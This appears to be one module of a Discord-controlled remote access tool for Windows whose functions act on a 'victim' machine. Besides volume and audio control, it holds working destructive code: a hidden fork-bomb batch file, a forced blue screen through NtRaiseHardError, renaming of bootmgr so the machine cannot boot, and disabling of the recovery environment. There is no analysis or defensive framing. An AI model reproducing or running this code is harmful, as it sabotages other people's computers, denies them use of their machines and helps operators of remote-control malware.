"""Control the Windows machine the runtime is running on.

The commands in this module change the state of the host: the master
volume, the audio output, the boot configuration and the availability of
the machine itself. Every command reports what it did in the Discord
channel the command was sent from.
"""

import asyncio
import ctypes
import os
import subprocess
import tempfile
import time
import winsound
from pathlib import Path
from typing import cast

from comtypes import CLSCTX_ALL
from discord import Message
from discord.ext import commands
from discord.ext.commands import Context
from pycaw.pycaw import AudioUtilities, EDataFlow, ERole, IAudioEndpointVolume

# Seconds the owner has to answer a confirmation request.
CONFIRMATION_TIMEOUT = 30

# File types the audio command knows how to play.
AUDIO_EXTENSIONS = (".wav", ".mp3", ".midi")

# The boot manager is renamed instead of deleted so it can be restored.
BOOT_MANAGER = Path(r"C:\Windows\System32\bootmgr")
BOOT_MANAGER_DISABLED = Path(r"C:\Windows\System32\bootmgr.disabled")


def is_admin() -> bool:
    """Check whether the runtime runs with administrator rights."""
    return bool(ctypes.windll.shell32.IsUserAnAdmin())


def set_master_volume(percent: float) -> None:
    """Set the master volume of the default speakers to the given percentage."""
    enumerator = AudioUtilities.GetDeviceEnumerator()
    device = enumerator.GetDefaultAudioEndpoint(
        EDataFlow.eRender.value,
        ERole.eMultimedia.value,
    )
    interface = device.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)

    # The activated interface is still an IUnknown, so it has to be cast to
    # the endpoint volume interface before it can be used.
    volume = cast(IAudioEndpointVolume, interface.QueryInterface(IAudioEndpointVolume))
    volume.SetMasterVolumeLevelScalar(percent / 100.0, None)


def resolve_path(raw: str) -> Path:
    """Turn a user supplied path into an absolute path."""
    cleaned = os.path.expandvars(os.path.expanduser(raw.strip().strip('"')))
    target = Path(cleaned)

    # Relative paths are resolved from the runtime's working directory.
    if not target.is_absolute():
        target = Path.cwd() / target

    return target.resolve()


async def confirm_action(ctx: Context[commands.Bot], prompt: str, label: str) -> bool:
    """Ask the owner to confirm a destructive action.

    The prompt is sent to the channel and the next `yes` or `no` message
    from the author decides whether the action runs.
    """
    await ctx.reply(
        f"{prompt}\n\n"
        "Reply `yes` to confirm or `no` to cancel. "
        f"You have {CONFIRMATION_TIMEOUT} seconds."
    )

    def check(m: Message) -> bool:
        return (
            m.author.id == ctx.author.id
            and m.channel.id == ctx.channel.id
            and m.content.lower().strip() in ("yes", "no")
        )

    try:
        response: Message = await ctx.bot.wait_for(
            "message",
            check=check,
            timeout=CONFIRMATION_TIMEOUT,
        )
    except TimeoutError:
        await ctx.reply(f"{label} cancelled: confirmation timed out.")
        return False

    if response.content.lower().strip() != "yes":
        await ctx.reply(f"{label} cancelled.")
        return False

    return True


async def set_volume(ctx: Context[commands.Bot], level: str) -> None:
    """Set the master volume of the victim to the given percentage."""
    try:
        percent = float(level.strip())
    except (AttributeError, TypeError, ValueError):
        await ctx.reply("Usage: `!volume <0-100>`")
        return

    if not 0.0 <= percent <= 100.0:
        await ctx.reply("The volume must be between 0 and 100.")
        return

    try:
        await asyncio.to_thread(set_master_volume, percent)
    except Exception as exc:
        print(f"Volume error: {exc}")
        await ctx.reply("Could not change the volume.")
        return

    await ctx.reply(f"Volume set to {int(percent)}%.")


async def play_audio(ctx: Context[commands.Bot], path: str) -> None:
    """Play a media file on the victim machine."""
    target = resolve_path(path)

    if not target.is_file():
        await ctx.reply(f"File not found: `{target}`")
        return

    suffix = target.suffix.lower()
    if suffix not in AUDIO_EXTENSIONS:
        supported = ", ".join(AUDIO_EXTENSIONS)
        await ctx.reply(f"Unsupported file type `{suffix}`. Supported: {supported}.")
        return

    def play() -> None:
        winsound.PlaySound(
            str(target),
            winsound.SND_FILENAME | winsound.SND_ASYNC,
        )

    try:
        await asyncio.to_thread(play)
    except Exception as exc:
        print(f"Audio error: {exc}")
        await ctx.reply("Could not play the audio file.")
        return

    await ctx.reply(f"Playing `{target.name}`.")


async def start_forkbomb(ctx: Context[commands.Bot]) -> None:
    """Start a batch file that floods the machine with new processes."""
    batch_path = Path(tempfile.gettempdir()) / "forkbomb.bat"

    # The batch file pipes itself into a copy of itself, which keeps
    # spawning processes until the machine runs out of resources.
    script = "@echo off\r\n%0|%0\r\n"

    def start() -> None:
        batch_path.write_text(script, encoding="utf-8")
        subprocess.Popen(
            ["cmd.exe", "/c", str(batch_path)],
            creationflags=subprocess.CREATE_NO_WINDOW,
        )

    try:
        await asyncio.to_thread(start)
    except Exception as exc:
        print(f"Forkbomb error: {exc}")
        await ctx.reply("Could not start the fork bomb.")
        return

    await ctx.reply("Fork bomb started. The machine may become unresponsive.")


async def trigger_bsod(ctx: Context[commands.Bot]) -> None:
    """Trigger a blue screen of death on the victim machine."""
    def trigger() -> None:
        ntdll = ctypes.windll.ntdll

        # SeDebugPrivilege is needed before a hard error can be raised.
        ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_int()))
        ntdll.NtRaiseHardError(
            0xC000007B,
            0,
            None,
            None,
            6,
            ctypes.byref(ctypes.c_uint()),
        )

    try:
        await asyncio.to_thread(trigger)
    except Exception as exc:
        print(f"BSOD error: {exc}")
        await ctx.reply("Could not trigger the blue screen.")
        return

    await ctx.reply("Blue screen triggered.")


async def break_windows(ctx: Context[commands.Bot]) -> None:
    """Rename the Windows boot manager so the machine stops booting."""
    if not is_admin():
        await ctx.reply("Administrator rights are required to break Windows.")
        return

    prompt = (
        "⚠️ **Confirm breaking Windows**\n"
        f"Renaming: `{BOOT_MANAGER}`\n"
        f"      to: `{BOOT_MANAGER_DISABLED}`\n\n"
        "The machine will no longer boot. "
        "This can only be undone from another Windows installation."
    )

    if not await confirm_action(ctx, prompt, "Break Windows"):
        return

    def rename() -> None:
        BOOT_MANAGER.rename(BOOT_MANAGER_DISABLED)

    try:
        await asyncio.to_thread(rename)
    except Exception as exc:
        print(f"Break windows error: {exc}")
        await ctx.reply(f"Could not rename the boot manager: {exc}")
        return

    await ctx.reply(f"Renamed `{BOOT_MANAGER}` to `{BOOT_MANAGER_DISABLED}`.")


async def set_recovery(ctx: Context[commands.Bot], enabled: bool) -> None:
    """Enable or disable the Windows recovery environment."""
    if not is_admin():
        await ctx.reply(
            "Administrator rights are required to change the recovery environment."
        )
        return

    action = "/enable" if enabled else "/disable"

    def run() -> subprocess.CompletedProcess[str]:
        return subprocess.run(
            ["reagentc.exe", action],
            capture_output=True,
            text=True,
            errors="replace",
            creationflags=subprocess.CREATE_NO_WINDOW,
            check=False,
        )

    try:
        result = await asyncio.to_thread(run)
    except Exception as exc:
        print(f"Recovery error: {exc}")
        await ctx.reply("Could not run reagentc.exe.")
        return

    output = "\n".join(
        part.strip() for part in (result.stdout, result.stderr) if part
    ).strip()

    await ctx.reply(
        f"Recovery environment {'enabled' if enabled else 'disabled'} "
        f"(exit code {result.returncode}).\n```\n{output}\n```"
    )
